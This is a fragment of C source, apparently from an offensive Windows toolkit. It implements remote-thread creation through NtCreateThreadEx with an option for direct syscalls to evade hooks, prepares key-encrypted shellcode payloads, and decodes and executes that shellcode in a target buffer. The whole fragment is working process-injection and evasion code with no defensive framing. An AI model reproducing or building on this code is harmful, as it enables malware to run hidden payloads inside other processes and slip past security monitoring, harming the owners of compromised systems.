HANDLE lil_nemo_candy_create_remote_thread(HANDLE proc, PVOID start_func, PVOID args, ULONG create_flag, pLIL_NEMO_BAG bag) {
    void *ntdll = NULL;
    if (bag->FLAG_use_addr == 1) {
        ntdll = bag->addr_ntdll;
    }
    else {
        if (bag->raw_ntdll[0] == 0) {
            return 0;
        }
        ntdll = bag->find_dll(bag->raw_ntdll, bag);
    }
    if (!ntdll) {
        return 0;
    }
    NTypeNtCreateThreadEx cr_th = bag->get_func2(lil_nemo_food_NtCreateThreadEx, ntdll, bag);
    HANDLE my_th;
    if (bag->FLAG_use_syscall == 1) {
        nemo_ssn_NtCreateThreadEx = bag->get_syscall2(cr_th);
        bag->last_ntstatus = NemoCandy_NtCreateThreadEx(&my_th, THREAD_ALL_ACCESS, 0, proc, start_func, args, create_flag, 0, 0, 0, 0);
    }
    else {
        bag->last_ntstatus = cr_th(&my_th, THREAD_ALL_ACCESS, 0, proc, start_func, args, create_flag, 0, 0, 0, 0);
    }
    return my_th;
}

pLNC_PAYLOAD_SHELLCODE_BASIC lil_nemo_candy_prepare_shellcode(NNType_CandyScodeFunc raw_scode, uint16_t *ekey, pLIL_NEMO_BAG bag) {
    pLNC_PAYLOAD_SHELLCODE_BASIC scode = raw_scode();
    if (ekey == 0) {
        ekey = bag->ekey;
    }
    int key_id = 0;
    while (ekey[key_id] != 0) {
        scode->key[key_id] = ekey[key_id];
        key_id++;
    }
    scode->s_size = sizeof(LNC_PAYLOAD_SHELLCODE_BASIC);
    return scode;
}

// --------------------- Inject Fnctions ----------------------------


void lil_nemo_candy_func_inject_shellcode(pLNC_PAYLOAD_SHELLCODE_BASIC scode) {
    int kid = 0;
    unsigned char *target = (unsigned char*)scode->target_ptr;
    for (int i=0; i<scode->shellcode_size; i++) {
        if (scode->key[kid] == 0) {
            kid = 0;
        }
        target[i] = scode->shellcode[i] - scode->key[kid];
        kid++;
    }
    void (*ready)(void) = scode->target_ptr;
    ready();
    return;
}

void lil_nemo_candy_func_inject_shellcode_end(void) {
    return;
}




